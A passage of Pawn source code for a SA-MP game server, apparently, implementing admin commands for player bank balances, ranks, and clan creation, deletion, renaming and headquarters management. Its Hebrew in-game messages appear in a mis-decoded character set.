		SendClientMessage(playerid,green,string);
		format(string,sizeof(string)," .фрующя ∙щЁф р· ыёЇъ ссЁў ь %d$",amount);
		SendClientMessage(id,green,string);
		format(string,sizeof(string),"setbank (%d)%s [%d$]",id,GetName(id),amount);
		Log("Attention",playerid,string);
		playerinfo[id][bank] = amount;
		if(playerinfo[id][logged]) fsetint(fuser(id),"Bank",playerinfo[id][bank]);
		return 1;
	}
	if(equal(cmd,"/removebank") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 17 && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 17");
		new cmd2[M_S], id, amount, string[M_S];
		cmd = strtok(cmdtext,idx), cmd2 = strtok(cmdtext,idx);
		if(!strlen(cmd) || !strlen(cmd2) || !IsNumeric(cmd2)) return SendClientMessage(playerid,white," /removebank [id/name] [money] :Ўх°· ф∙щюх∙");
		id = ReturnUser(cmd,playerid);
		if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .рщщущ ∙тхщ");
		if(!CommandAllowed(playerid,id,cmdtext)) return 1;
		amount = strval(cmd2);
		if(amount < 1 || amount > 99999999) return SendClientMessage(playerid,red," .ёыхэ фыёє ∙фўьу· тухь юущ рх ўшя юущ");
		format(string,sizeof(string)," .%s фх°у· %d$ юфсЁў ∙ь",GetName(id),amount);
		SendClientMessage(playerid,green,string);
		format(string,sizeof(string)," .фрующя фх°щу юч∙схя фсЁў ∙ьъ %d$",amount);
		SendClientMessage(id,green,string);
		playerinfo[id][bank] -= amount;
		if(playerinfo[id][logged]) fsetint(fuser(id),"Bank",playerinfo[id][bank]);
		new str[M_S];
		format(str, sizeof(str), "[admincmd] removebank to %s: %d$", GetName(id), amount);
		Log("Money", playerid, str);
		return 1;
	}
	if(equal(cmd,"/addrank") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 19 && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 19");
		new string[M_S], id = -1;
		cmd = strrest(cmdtext,idx);
		if(!strlen(cmd) || IsNumeric(cmd)) return SendClientMessage(playerid,white," /addrank [rank name] :Ўх°· ф∙щюх∙");
		if(cmd[0] >= '0' && cmd[0] <= '9') return SendClientMessage(playerid,red," .фюЄ°ы· цщф·ф ∙шЄщ· сЇўхуф"), SendClientMessage(playerid,red," .ыущ ьфхёщє рх ьфёщ° ющ∙фх ю°рЁў /setrank ыущ ьщЎх° °рЁўщэ чу∙щэ, хсЇўхуф/addrank ф∙·ю∙ сЇўхуф");
		for(new i = 0; i < MAX_RANKS; i++) if(equal(cmd,rankname[i])) return SendClientMessage(playerid,red," .ыс° ўщщю· ўсхЎ· ю∙·ю∙щэ ыцх");
		for(new i = 0; i < MAX_RANKS; i++) if(equal(rankname[i],"None") || !strlen(rankname[i]))
		{
			id = i;
			break;
		}
		if(id == -1) return SendClientMessage(playerid,red," .ьр фщф Ёщ·я ьщЎх° ўсхЎ· ю∙·ю∙щэ чу∙ф");
		format(rankname[id],sizeof(rankname[]),cmd);
		format(string,sizeof(string),"Rank%02d",id);
		fsetstring(file_ranks,string,cmd);
		SendClientMessage(playerid,green," :фхёЇ· р· ўсхЎ· фю∙·ю∙щэ");
		SendClientMessage(playerid,green,cmd);
		RecreateRanks();
		return 1;
	}
	if(equal(cmd,"/removerank") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 19 && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 19");
		new string[M_S], id = -1;
		cmd = strrest(cmdtext,idx);
		if(!strlen(cmd) || IsNumeric(cmd)) return SendClientMessage(playerid,white," /removerank [rank name] :Ўх°· ф∙щюх∙");
		id = RankID(cmd);
		if(id == -1) return SendClientMessage(playerid,red," .ьр ЁюЎрф ∙хэ ўсхЎ· ю∙·ю∙щэ с∙э ∙Ё··");
		SendClientMessage(playerid,green,cmd);
		format(string,sizeof(string),"rank_%s",ToEnglish_Ret(rankname[id]));
		if(PropertyExists_INT(string)) RemoveProperty_INT(string);
		for(new i = 0; i < MAX_PLAYERS_; i++) if(IsPlayerConnected(i) && playerinfo[i][rank][id]) playerinfo[i][rank][id] = 0;
		format(rankname[id],sizeof(rankname[]),"None");
		format(string,sizeof(string),"Rank%02d",id);
		fsetstring(file_ranks,string,cmd);
		SendClientMessage(playerid,green," :ючў· р· ўсхЎ· фю∙·ю∙щэ");
		return 1;
	}
	if(equal(cmd,"/clhelp") && (IsPlayerMAdmin(playerid) || PlayerHasRank(playerid,RankID("юЁфьщ ўьрЁщэ"))))
	{
		if((playerinfo[playerid][admin] < 11 && !PlayerHasRank(playerid,RankID("юЁфьщ ўьрЁщэ"))) && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 11");
		SendClientMessage(playerid,lightblue," ~~~ :Їўхух· юЁфьщ ўьрЁщэ ~~~");
		SendClientMessage(playerid,yellow," /clhelp Х /createclan Х /dclan Х /setclan Х /clannumber Х /setlclan Х /clanname");
		SendClientMessage(playerid,yellow," /getcbank Х /setcbank Х /telehq Х /createcbank Х /deletecbank Х /clanmsg");
		SendClientMessage(playerid,yellow," /loadhq Х /unloadhq Х /reloadhq Х /lockhq Х /unlockhq");
		return 1;
	}
	if(equal(cmd,"/createclan") && (IsPlayerMAdmin(playerid) || PlayerHasRank(playerid,RankID("юЁфьщ ўьрЁщэ"))))
	{
		if((playerinfo[playerid][admin] < 11 && !PlayerHasRank(playerid,RankID("юЁфьщ ўьрЁщэ"))) && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 11");
		new name[256], string[M_S], clanid, Float:p[4];
		name = strtok(cmdtext,idx);
		if(name[0] == ' ') strdel(name,0,1);
		if(!strlen(name)) return SendClientMessage(playerid,white," /createclan [clan name] :Ўх°· ф∙щюх∙");
		if(equal(name,"None")) return SendClientMessage(playerid,red," .уххўр р· ф∙э фцф? ·сч° рчу рч°");
		if(strlen(name) > MAX_PLAYER_NAME) return SendClientMessage(playerid,red," .∙э р°хъ юущ");
		for(new i=0;i<strlen(name);i++) if(name[i] < '0' && name[i] > '9' && name[i] < 'a' && name[i] > 'z' && name[i] < 'A' && name[i] > 'Z' && name[i] != '_' && name[i] != '[' && name[i] != ']') return SendClientMessage(playerid,red," .чьў юфрх·щх· сыщЁхщ ∙ы·с· ьр щыхьх· ьфыЁё ь∙э ∙ь ўьря");
		format(string,sizeof(string),"/DM/Clans/%s.ini",name);
		if(fexist(string)) return SendClientMessage(playerid,red," .фўьря фцф ыс° ўщщэ");
		clanid = GetEmptyClanID();
		if(clanid == -1) return SendClientMessage(playerid,red," .(ьр Ёщ·я ьщЎх° ўьрЁщэ (ыюх· тсхфф юущ");
		fcreate(string);
		fsetint(string,"ID",clanid);
		fsetint(string,"R",255);
		fsetint(string,"G",255);
		fsetint(string,"B",255);
		fsetint(string,"Bank",0);
		fsetstring(string,"Name",name);
		GetPlayerPos(playerid,p[0],p[1],p[2]);
		GetPlayerFacingAngle(playerid,p[3]);
		fsetfloat(string,"X",p[0]);
		fsetfloat(string,"Y",p[1]);
		fsetfloat(string,"Z",p[2]);
		fsetfloat(string,"Rot",p[3]);
		fsetfloat(string,"VX",p[0]);
		fsetfloat(string,"VY",p[1]);
		fsetfloat(string,"VZ",p[2]);
		fsetfloat(string,"VR",p[3]);
		fsetint(string,"LockBank",0);
		fsetint(string,"MaxBank",1000000);
		for(new i = 1; i <= MAX_CBANK_LOGS; i++)
		{
			format(cmd,sizeof(cmd),"BankLog%d",i);
			fsetstring(string,cmd,"None");
		}
		fsetint(string,"ChatColor",0x00FFFFAA);
		fsetint(string,"ChatColorL",0x00FFFFAA);
		fsetint(string,"WarWinTimes",0);
		fsetint(string,"GangZoneShow",1);
		fsetint(string,"GangZoneSize",3);
		fsetint(string,"Ruler",clanid);
		for(new i = 0; i < max_clanperms; i++)
		{
			format(cmd,sizeof(cmd),"Permission%d",ClanPermissions[i][clpUniqueID]);
			fsetint(string,cmd,ClanPermissions[i][clpDefault]);
			claninfo[clanid][cperms][i] = ClanPermissions[i][clpDefault];
		}
		for(new i = 0; i < max_clansystems; i++)
		{
			format(cmd,sizeof(cmd),"System%d",ClanSystems[i][clsUniqueID]);
			fsetint(string,cmd,0);
			claninfo[clanid][csystems][i] = false;
			if(ClanSystems[i][clsUniqueID] != -1)
			{
				format(cmd,sizeof(cmd),"System%dParam",ClanSystems[i][clsUniqueID]);
				fsetint(string,cmd,ClanSystems[i][clsUniqueID]);
				claninfo[clanid][csystemparam][i] = ClanSystems[i][clsUniqueID];
			}
		}
		for(new i = 0; i < sizeof(cupowers); i++)
		{
			format(cmd,sizeof(cmd),"Power%d",cupowers[i][CUPID]);
			fsetint(string,cmd,0);
			claninfo[clanid][cpowers][i] = false;
		}
		fsetint(string,"LockHQ",0);
		format(claninfo[clanid][cname],256,name);
		claninfo[clanid][chqid] = -1;
		claninfo[clanid][cmembers] = 0;
		claninfo[clanid][cbank] = 0;
		//claninfo[clanid][ccp] = -1;
		claninfo[clanid][cvalid] = 1;
		for(new i=0;i<4;i++) claninfo[clanid][ccolor][i == 3 ? 2 : i] = 255, claninfo[clanid][chq][i] = p[i], claninfo[clanid][chqv][i] = p[i];
		fsetstring(string,"Command",name);
		for(new i = 1; i < MAX_CLANS; i++) claninfo[clanid][cpeace][i] = false, claninfo[i][cpeace][clanid] = false, claninfo[clanid][cask][i] = false, claninfo[i][cask][clanid] = false;
		claninfo[clanid][ctest] = 0;
		claninfo[clanid][cchatlock] = 0;
		claninfo[clanid][cchatcolor] = {0x00FFFFAA,0x00FFFFAA};
		claninfo[clanid][cchatpeace] = 0;
		format(claninfo[clanid][ccmd],32,name);
		claninfo[clanid][clbank] = 0;
		claninfo[clanid][cmaxbank] = 250000;
		fsetint(string, "maxbank", 250000);
		claninfo[clanid][cwarasked] = {0,-1};
		claninfo[clanid][cwarplayers] = 0;
		claninfo[clanid][cwarplayer] = INVALID_PLAYER_ID;
		claninfo[clanid][cinwar] = 0;
		claninfo[clanid][cwarcd] = 0;
		claninfo[clanid][cmessage][0] = 'x', claninfo[clanid][cmessage][1] = 0;
		for(new i = 0; i < sizeof(crules[]); i++) crules[clanid][i] = "x";
		claninfo[clanid][cwintimes] = 0;
		claninfo[clanid][cruletimes] = 0;
		for(new i = 0; i < sizeof(csigns[]); i++) csigns[clanid][i] = "x";
		for(new i = 0; i < MAX_CLAN_CAMERAS; i++) ccameras[clanid][i][camPos][0] = 0.0, ccameras[clanid][i][camPos][1] = 0.0, ccameras[clanid][i][camPos][2] = 0.0, ccameras[clanid][i][camLevel] = 0, ccameras[clanid][i][camObject] = INVALID_OBJECT_ID;
		claninfo[clanid][cusingpower] = 0;
		claninfo[clanid][cendpower] = {0,-1};
		claninfo[clanid][cgodobject] = 0;
		claninfo[clanid][cgodobjects] = 0;
		claninfo[clanid][cruler] = clanid;
		claninfo[clanid][cruling] = {0,0,0};
		claninfo[clanid][crulingtext] = INVALID_TEXT_DRAW;
		claninfo[clanid][cclosetele] = -1;
		claninfo[clanid][cgzoneshow] = 1;
		claninfo[clanid][cgzonesize] = 3;
		ClanPList_Create(clanid);
		format(string,sizeof(string)," .\"%s\" щЎ°· р· фўьря",name);
		SendClientMessage(playerid,green,string);
		format(string,sizeof(string)," юёЇ° ўьря: %d",clanid);
		SendClientMessage(playerid,green,string);
		fsetint(file_clans,"Count",GetHighestClanID()+1);
		valstr(string,clanid);
		fsetstring(file_clans,string,name);
		MAXCLANS = GetHighestClanID();
		format(string,sizeof(string),"<ADMIN> created clan \"%s\"",name);
		Log("Clans",playerid,string);
		return 1;
	}
	if(equal(cmd,"/dclan") && (IsPlayerMAdmin(playerid) || PlayerHasRank(playerid,RankID("юЁфьщ ўьрЁщэ"))))
	{
		if((playerinfo[playerid][admin] < 11 && !PlayerHasRank(playerid,RankID("юЁфьщ ўьрЁщэ"))) && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 11");
		new string[M_S], clanid, f[64];
		cmd = strrest(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /dclan [clan name] :Ўх°· ф∙щюх∙");
		clanid = clannumber(cmd);
		if(!clanid) return SendClientMessage(playerid,red," .ўьря ∙тхщ");
		if(claninfo[clanid][cprotected] && !playerinfo[playerid][pp] && playerinfo[playerid][admin] < 18) return SendClientMessage(playerid,red," .ўьря цф юхтя");
    	new thehq = GetClanHQ(clanid);
    	if(thehq != -1)
    	{
    	    new str[M_S];
    	    format(str, sizeof(str), folder_hq "%d.ini", thehq);
    	    fsetint(str, "HQOwner", -1);
    	    viewhqinfo[thehq][hqowner] = -1;
    	    UnloadClanHeadquarter(clanid);
    	    LoadViewHQ(thehq);
    	}
		claninfo[clanid][cvalid] = 0;
		if(claninfo[clanid][cgzone] != INVALID_GANG_ZONE) DestroyClanGangZone(clanid);
		//if(claninfo[clanid][ccp] != -1) cpinfo[claninfo[clanid][ccp]][cpactive] = 0;
		for(new i = 1; i < MAX_CLANS; i++)
		{
			if(claninfo[i][cpeace][clanid])
			{
				claninfo[clanid][cpeace][i] = false, claninfo[i][cpeace][clanid] = false;
				format(f,sizeof(f),"/DM/Clans/%s.ini",claninfo[i][cname]);
				for(new j = 1; j <= MAX_CLAN_ALLIANCES; j++)
				{
					format(string,sizeof(string),"Peace%d",i);
					if(fkeyexist(f,string) && equal(fgetstring(f,string),claninfo[clanid][cname])) fsetstring(f,string,"None");
				}
			}
			if(claninfo[i][cruler] == clanid && i != clanid)
			{
				claninfo[i][cruler] = i;
				UpdateClanGangZone(i);
				format(string,sizeof(string)," !∙∙ьш Єь фюЇўуф ∙ь фўьря ∙ьъ Ёючў, фюЇўуф ∙хч°°ф %s юыщххя ∙фўьря",claninfo[clanid][cname]);
				for(new j = 0; j < MAX_PLAYERS_; j++) if(IsPlayerConnected(j) && playerinfo[j][clan] == i) SendClientMessage(j,yellow,string);
				format(string,sizeof(string)," !ыс° ьр ўщщэ (%s) фхЇёўф юрч° хфўьря ∙∙ьш сфэ %s фф∙·ьшх· Єь юЇўу·",claninfo[clanid][cname],claninfo[i][cname]);
				SendClientMessageToAll(orange,string);
			}
			if(claninfo[i][cruling][0] == clanid) Retreat(i,"фўьря фЁ∙ьш Ёючў");
		}
		if(claninfo[clanid][cruling][0] != 0) Retreat(clanid,"фўьря фю∙·ьш Ёючў");
		UpdateClanGangZone(clanid);
		for(new i=0;i<MAX_PLAYERS_;i++) if(IsPlayerConnected(i) && playerinfo[i][clan] == clanid)
		{
			PlayerLeaveClan(i,true);
			SendClientMessage(i,red," .фрующя ючў р· фўьря ∙ьъ");
		}
		ClanPList_Remove(clanid);
		format(string,sizeof(string),"/DM/Clans/%s.ini",cmd);
		fremove(string);
		valstr(string,clanid);
		fsetstring(file_clans,string,"None");
		format(string,sizeof(string)," .\"%s\" ючў· р· фўьря",cmd);
		SendClientMessage(playerid,green,string);
		format(string,sizeof(string),"<ADMIN> deleted clan \"%s\"",cmd);
		Log("Clans",playerid,string);
		return 1;
	}
	if(equal(cmd,"/setclan") && (IsPlayerMAdmin(playerid) || PlayerHasRank(playerid,RankID("юЁфьщ ўьрЁщэ"))))
	{
		if((playerinfo[playerid][admin] < 11 && !PlayerHasRank(playerid,RankID("юЁфьщ ўьрЁщэ"))) && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 11");
		new cmd2[64], id, c, string[M_S];
		cmd = strtok(cmdtext,idx), cmd2 = strtok(cmdtext,idx);
		if(!strlen(cmd) || !strlen(cmd2)) return SendClientMessage(playerid,white," /setclan [id/name] [clan name / None] :Ўх°· ф∙щюх∙");
		id = ReturnUser(cmd,playerid);
		if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .рщщущ ∙тхщ");
		if(!CommandAllowed(playerid,id,cmdtext)) return 1;
		if(playerinfo[id][clan] && !equal(cmd2,"None")) return SendClientMessage(playerid,red," .ф∙чўя ∙сч°· ыс° сўьря");
		if(equal(cmd2,"gmR") && !playerinfo[playerid][pp]) return SendClientMessage(playerid,red," .gmR ьр ьтЄ· с");
		c = equal(cmd2,"None") ? -1 : clannumber(cmd2);
		if(!c) return SendClientMessage(playerid,red," .ўьря ∙тхщ");
		if(c == -1)
		{
			if(!playerinfo[id][clan]) return SendClientMessage(playerid,red," .ю∙·ю∙ цф ьр сўьря");
			if(claninfo[playerinfo[id][clan]][cprotected] && !playerinfo[playerid][pp] && playerinfo[playerid][admin] < 18) return SendClientMessage(playerid,red," .ўьря цф юхтя");
			format(string,sizeof(string)," .\"%s\" юфўьря %s фхЎр· р·",claninfo[playerinfo[id][clan]][cname],GetName(id));
			SendClientMessage(playerid,green,string);
			format(string,sizeof(string)," .\"%s\" фрующя фхЎщр рх·ъ юфўьря",claninfo[playerinfo[id][clan]][cname]);
			SendClientMessage(id,green,string);
			PlayerLeaveClan(id,true);
			format(string,sizeof(string)," * фхЎр юфўьря ∙ьъ Єь щущ фрующя %s",GetName(id));
			ClanNotification(playerinfo[id][clan],string);
			format(string,sizeof(string),"<ADMIN> kicked %s from clan %s",GetName(id),claninfo[playerinfo[id][clan]][cname]);
		}
		else
		{
			if(claninfo[c][cprotected] && !playerinfo[playerid][pp] && playerinfo[playerid][admin] < 18) return SendClientMessage(playerid,red," .ўьря цф юхтя");
			new usedp = ClanPList_Add(c,id);
			if(usedp == -1) return SendClientMessage(playerid,red," .ьр фщф Ёщ·я ьЎ°є р· фю∙·ю∙ ьўьря цф. ыыь фЁ°рф, фўьря фтщЄ ьютсь· ф∙чўЁщэ фюх·°·");
			for(new j=0;j<claninfo[c][cmembers];j++)
			{
				format(string,sizeof(string)," .Ўх°є ьўьря ∙ьъ Єь щущ фрующя %s",GetName(id));
				SendClientMessage(claninfo[c][cplayers][j],green,string);
			}
			playerinfo[id][clan] = c;
			claninfo[c][cplayers][claninfo[c][cmembers]] = id;
			claninfo[c][cmembers]++;
			SetPlayerColor(id,rgba2hex(claninfo[c][ccolor][0],claninfo[c][ccolor][1],claninfo[c][ccolor][2],PLAYER_ALPHA));
			format(string,sizeof(string)," .Єь щущ фрующя \"%s\" Ўх°Ї· ьўьря",claninfo[playerinfo[id][clan]][cname]);
			SendClientMessage(id,green,string);
			format(string,sizeof(string)," .\"%s\" ьўьря %s Ўщ°Ї· р·",claninfo[playerinfo[id][clan]][cname],GetName(id));
			SendClientMessage(playerid,green,string);
			if(playerinfo[id][logged]) fsetstring(fuser(id),"ClanCode",clancode(playerinfo[id][clan]));
			playerinfo[id][iclan] = 0, playerinfo[id][lclan] = 1;
			format(string,sizeof(string),"<ADMIN> set clan of %s to %s",GetName(id),claninfo[playerinfo[id][clan]][cname]);
		}
		Log("Clans",playerid,string);
		return 1;
	}
	if(equal(cmd,"/clannumber") && (IsPlayerMAdmin(playerid) || PlayerHasRank(playerid,RankID("юЁфьщ ўьрЁщэ"))))
	{
		if((playerinfo[playerid][admin] < 11 && !PlayerHasRank(playerid,RankID("юЁфьщ ўьрЁщэ"))) && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 11");
		new cstring[M_S], string[M_S];
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /clannumber [clan name] :Ўх°· ф∙щюх∙");
		format(cstring,sizeof(cstring),"/DM/Clans/%s.ini",cmd);
		if(!fexist(cstring)) return SendClientMessage(playerid,red," .фўьря ьр ЁюЎр рх ∙фўьря ьр °∙ющ");
		format(string,sizeof(string)," .фхр %d %s юёЇ° фўьря",fgetint(cstring,"ID"),cmd);
		SendClientMessage(playerid,green,string);
		return 1;
	}
	if(equal(cmd,"/setlclan") && (IsPlayerMAdmin(playerid) || PlayerHasRank(playerid,RankID("юЁфьщ ўьрЁщэ"))))
	{
		if((playerinfo[playerid][admin] < 11 && !PlayerHasRank(playerid,RankID("юЁфьщ ўьрЁщэ"))) && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 11");
		new cmd2[256], id, lvl, string[M_S];
		cmd = strtok(cmdtext,idx), cmd2 = strtok(cmdtext,idx);
		if(!strlen(cmd) || !strlen(cmd2) || !IsNumeric(cmd2)) return SendClientMessage(playerid,white," /setlclan [id/name] [level 1 - 5] :Ўх°· ф∙щюх∙");
		id = ReturnUser(cmd,playerid);
		if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .рщщущ ∙тхщ");
		if(!CommandAllowed(playerid,id,cmdtext)) return 1;
		if(playerinfo[id][clan] == 0)
		{
			format(string,sizeof(string)," .ьр сўьря %s",GetName(id));
			return SendClientMessage(playerid,red,string);
		}
		if(claninfo[playerinfo[id][clan]][cprotected] && !playerinfo[playerid][pp] && playerinfo[playerid][admin] < 18) return SendClientMessage(playerid,red," .ўьря цф юхтя");
		lvl = strval(cmd2);
		if((lvl < 1 || lvl > 5) && playerinfo[playerid][admin] != 20) return SendClientMessage(playerid,red," .°ю· тщ∙х· ∙тхщф");
		if(playerinfo[id][lclan] == lvl) return SendClientMessage(playerid,red," .фю∙·ю∙ ыс° ЁюЎр с°ю· фтщ∙х· ∙ЎщщЁ·");
		format(string,sizeof(string)," .фрующя ∙щЁф р· °ю· фтщ∙х· ∙ьъ сўьря ь°юф %d",lvl);
		SendClientMessage(id,green,string);
		format(string,sizeof(string)," .ь %d %s ∙щЁщ· р· °ю· фтщ∙х· сўьря ∙ь",lvl,GetName(id));
		SendClientMessage(playerid,green,string);
		playerinfo[id][lclan] = lvl;
		if(playerinfo[id][logged]) fsetint(fuser(id),"ClanLevel",lvl);
		format(string,sizeof(string),"<ADMIN> set clan level of %s to %d",GetName(id),lvl);
		Log("Clans",playerid,string);
		return 1;
	}
	if(equal(cmd,"/clanname") && (IsPlayerMAdmin(playerid) || PlayerHasRank(playerid,RankID("юЁфьщ ўьрЁщэ"))))
	{
		if((playerinfo[playerid][admin] < 11 && !PlayerHasRank(playerid,RankID("юЁфьщ ўьрЁщэ"))) && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 11");
		new cmd2[256], c, string[M_S], string2[M_S];
		cmd = strtok(cmdtext,idx), cmd2 = strtok(cmdtext,idx);
		if(!strlen(cmd) || !strlen(cmd2)) return SendClientMessage(playerid,white," /clanname [old name] [new name] :Ўх°· ф∙щюх∙");
		c = clannumber(cmd);
		if(c == -1) return SendClientMessage(playerid,red," .ўьря ∙тхщ");
		if(equal(cmd,"gmR") && !playerinfo[playerid][pp]) return SendClientMessage(playerid,red," .gmR ьр ьтЄ· с");
		if(equal(cmd,"Hyper") && !equal(GetName(playerid),"Danny_Topher") && !playerinfo[playerid][pp]) return SendClientMessage(playerid,red," .Hyper ьр ьтЄ· с");
		//for(new i=1;i<MAX_CLANS;i++) if(equal(cmd2,claninfo[i][cname])) return SendClientMessage(playerid,red," .∙э фўьря ыс° с∙щюх∙");
		format(string,sizeof(string),"/DM/Clans/%s.ini",cmd);
		format(string2,sizeof(string2),"/DM/Clans/%s.ini",cmd2);
		if(!fexist(string)) return SendClientMessage(playerid,red," .Ўхщщя ўьря ∙тхщ");
		if(fexist(string2)) return SendClientMessage(playerid,red," .фўьря фцф ыс° ўщщэ");
		new bool:ret = false;
		ret = fcopytextfile(string,string2) ? true : false;
		if(ret) fremove(string);
		valstr(string2,c);
		fsetstring(file_clans,string2,cmd2);
		format(claninfo[c][cname],256,cmd2);
		format(string2,sizeof(string2),"/DM/Clans/%s.ini",cmd2);
		fsetstring(string2,"Name",cmd2);
		format(string,sizeof(string)," .%s ∙щЁщ· р· ф∙э ∙ь ўьря юёЇ° %d ь",cmd2,c);
		SendClientMessage(playerid,green,string);
		return 1;
	}
	if(equal(cmd,"/getcbank") && (IsPlayerMAdmin(playerid) || PlayerHasRank(playerid,RankID("юЁфьщ ўьрЁщэ"))))
	{
		if((playerinfo[playerid][admin] < 11 && !PlayerHasRank(playerid,RankID("юЁфьщ ўьрЁщэ"))) && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 11");
		new c, string[M_S];
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd) || IsNumeric(cmd)) return SendClientMessage(playerid,white," /getcbank [clan name] :Ўх°· ф∙щюх∙");
		c = clannumber(cmd);
		if(!c) return SendClientMessage(playerid,red," .ўьря ∙тхщ");
		format(string,sizeof(string)," .фхр %d$ %s юёЇ° фыёє ссЁў ∙ь фўьря",claninfo[c][cbank],claninfo[c][cname]);
		SendClientMessage(playerid,green,string);
		format(string,sizeof(string),"<ADMIN> get clan bank of %s (%d$)",claninfo[c][cname],claninfo[c][cbank]);
		Log("Clans",playerid,string);
		return 1;
	}
	if(equal(cmd,"/setcbank") && (IsPlayerMAdmin(playerid) || PlayerHasRank(playerid,RankID("юЁфьщ ўьрЁщэ"))))
	{
		if((playerinfo[playerid][admin] < 11 && !PlayerHasRank(playerid,RankID("юЁфьщ ўьрЁщэ"))) && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 11");
		new cmd2[256], c, b, string[M_S];
		cmd = strtok(cmdtext,idx), cmd2 = strtok(cmdtext,idx);
		if(!strlen(cmd) || !strlen(cmd2) || IsNumeric(cmd) || !IsNumeric(cmd2)) return SendClientMessage(playerid,white," /setcbank [clan name] [bank money] :Ўх°· ф∙щюх∙");
		c = clannumber(cmd), b = strval(cmd2);
		if(!c) return SendClientMessage(playerid,red," .ўьря ∙тхщ");
		if(claninfo[c][cprotected] && !playerinfo[playerid][pp] && playerinfo[playerid][admin] < 18) return SendClientMessage(playerid,red," .ўьря цф юхтя");
		if(b < 0) return SendClientMessage(playerid,red," .ёыхэ ∙тхщ");
		if(claninfo[c][cmaxbank] < b) return SendClientMessage(playerid, red, " .ёыхэ цф Єхўє р· фютсьф ∙ь сЁў фўьря");
		format(string,sizeof(string),"setcbank %s [%d$]",claninfo[c][cname],b);
		Log("Attention",playerid,string);
		format(string,sizeof(string),"/DM/Clans/%s.ini",claninfo[c][cname]);
		fsetint(string,"Bank",b);
		format(string,sizeof(string),"<ADMIN> set clan bank of %s (%d$) to %d$",claninfo[c][cname],claninfo[c][cbank],b);
		Log("Clans",playerid,string);
		claninfo[c][cbank] = b;
		format(string,sizeof(string)," .ь %d$ %s ∙щЁщ· р· юёЇ° фыёє ссЁў ∙ь фўьря",b,claninfo[c][cname]);
		SendClientMessage(playerid,green,string);
		AdminInfo(playerid,cmdtext);
		new str[M_S];
		format(str, sizeof(str), "[admincmd] csetbank to clan %s: %d$", claninfo[c][cname], b);
		Log("Money", playerid, str);
		return 1;
	}
	if(equal(cmd,"/gotohq") && (IsPlayerMAdmin(playerid) || PlayerHasRank(playerid,RankID("юЁфьщ ўьрЁщэ"))))
	{
		if((playerinfo[playerid][admin] < 11 && !PlayerHasRank(playerid,RankID("юЁфьщ ўьрЁщэ"))) && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 11");
		new string[M_S];
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd) || IsNumeric(cmd)) return SendClientMessage(playerid,white," /gotohq [hq id] :Ўх°· ф∙щюх∙");
		new hqid = strval(cmd) - 1;
		if(!CanBeTeleported(playerid)) return 1;
		if(hqid < 0 || hqid > sizeof(viewhqinfo) || !viewhqinfo[hqid][hqvalid]) return SendClientMessage(playerid,red," .юЇўуф ∙тхщф");
		switch(GetPlayerState(playerid))
		{
			case PLAYER_STATE_ONFOOT, PLAYER_STATE_PASSENGER:
			{
				SetPlayerPos(playerid,viewhqinfo[hqid][hqxmid]+floatrand(-1.0,1.0),viewhqinfo[hqid][hqymid]+floatrand(-1.0,1.0),viewhqinfo[hqid][hqzmid]);
				SetPlayerFacingAngle(playerid,180);
			}
			case PLAYER_STATE_DRIVER:
			{
				SetVehiclePos(GetPlayerVehicleID(playerid),viewhqinfo[hqid][hqxmid]+floatrand(-3.0,3.0),viewhqinfo[hqid][hqymid]+floatrand(-3.0,3.0),viewhqinfo[hqid][hqzmid],playerid);
				SetVehicleZAngle(GetPlayerVehicleID(playerid),180);
				LinkVehicleToInterior(GetPlayerVehicleID(playerid),0);
				SetVehicleVirtualWorld(GetPlayerVehicleID(playerid),0);
			}
		}
		SetCameraBehindPlayer(playerid);
		SetPlayerInterior(playerid,0);
		SetPlayerVirtualWorld(playerid,0);
		format(string,sizeof(string),"~y~]~h~#%d ~n~~h~headquarter~y~]",hqid + 1);
		GameTextForPlayer(playerid,string,1500,4);
		format(string,sizeof(string),"<ADMIN> teleported to view hq #%d",hqid + 1);
		Log("Clans",playerid,string);
		return 1;
	}
	if(equal(cmd,"/telehq") && (IsPlayerMAdmin(playerid) || PlayerHasRank(playerid,RankID("юЁфьщ ўьрЁщэ"))))
	{
		if((playerinfo[playerid][admin] < 11 && !PlayerHasRank(playerid,RankID("юЁфьщ ўьрЁщэ"))) && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 11");
		new c, string[M_S];
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd) || IsNumeric(cmd)) return SendClientMessage(playerid,white," /telehq [clan name] :Ўх°· ф∙щюх∙");
		c = clannumber(cmd);
